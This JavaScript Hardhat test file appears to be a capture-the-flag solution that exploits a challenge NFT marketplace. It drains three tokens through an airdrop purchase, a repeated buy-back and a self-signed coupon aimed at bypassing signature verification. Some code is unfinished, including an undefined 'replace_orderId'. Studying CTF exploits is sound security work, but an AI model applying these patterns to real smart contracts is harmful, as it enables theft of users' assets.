const hre = require('hardhat');
const {ethers} = require("ethers");
const { expect } = require('chai');
const { setBalance } = require('../util');
const {create_max_uint64_bytes} = require("./max_uint64_bytes");

require("../util");

describe('[Challenge] resucue', function () {
    let nftMarket;
    let shaneson;
    let verifier;
    let nftToken;
    let tctfNFT;

    async function checkBalance() {
        console.log(await nftToken.balanceOf(shaneson.address));
    }

    before(async function () {
        // localhost；0xb3Df02AF5FbC5579D6D7eBfC4F0F70e7Ef126E52
        // game: 0x7B8CAeA73F647F3062b21B940BaAD6B43492FeaB

        // nftMarket = await ethers.getContractAt("TctfMarket", "0xb3Df02AF5FbC5579D6D7eBfC4F0F70e7Ef126E52");

        const TctfMarket = await hre.ethers.getContractFactory("TctfMarket");
        nftMarket = await TctfMarket.deploy();
        await nftMarket.deployed();
        
        const result = await nftMarket.getOrder(0);
        console.log(result);

        shaneson = await hre.ethers.getSigner(1);

        nftToken = await hre.ethers.getContractAt("TctfToken", await nftMarket.tctfToken());
        tctfNFT = await hre.ethers.getContractAt("TctfNFT", await nftMarket.tctfNFT());
    });

    it('Exploit tokenId 1, NFT', async function() {
        await nftToken.connect(shaneson).airdrop();
        await checkBalance();

        await nftToken.connect(shaneson).approve(nftMarket.address, ethers.constants.MaxUint256);
        await nftMarket.connect(shaneson).purchaseOrder(0);
        await checkBalance();
    });

    it('Exploit tokenId 2, NFT', async function() {
        await tctfNFT.connect(shaneson).setApprovalForAll(nftMarket.address, true);
        await nftMarket.connect(shaneson).createOrder(tctfNFT.address, 1, 1);
        // Item: 2,3,1

        await nftMarket.purchaseTest(tctfNFT.address, 1, 1337);
        await checkBalance();

        // buy back

        await nftMarket.connect(shaneson).purchaseOrder(1);
        await nftMarket.connect(shaneson).purchaseOrder(1);

        await checkBalance();
    });



    // Exploit tokenId 3, NFT
    it('Exploit tokenId 3, NFT', async function () {    
        
        const _verifierAddress = await nftMarket.verifier();
        console.log(_verifierAddress);
        verifier = await hre.ethers.getContractAt("CouponVerifierBeta", _verifierAddress);

  
        // attack arguments
        orderId = 0
        newPirce = 1
        iusser = shaneson.address
        user = shaneson.address
        reason = "shaneson"

        message = await verifier.verifyCouponTest(replace_orderId, iusser, user, newPirce, reason);
        console.log("message >>>> ", message);
        // getMessage
        let flatSig = await shaneson.signMessage(message);
        console.log("flatSig >>> ", flatSig)
        let sig = ethers.utils.splitSignature(flatSig);
        console.log("sig >>> ", sig)

        console.log(shaneson.address)
        const calldata = [
            [
                orderId,
                newPirce,
                iusser,
                user,
                reason
            ],
            [            
                sig.v,
                [            
                    sig.r,
                    sig.s
                ]
            ]
        ];

        await verifier.verifyCoupon(calldata);
        // await nftMarket.connect(shaneson).purchaseWithCoupon(calldata);
    });

    after(async function () {
    });
});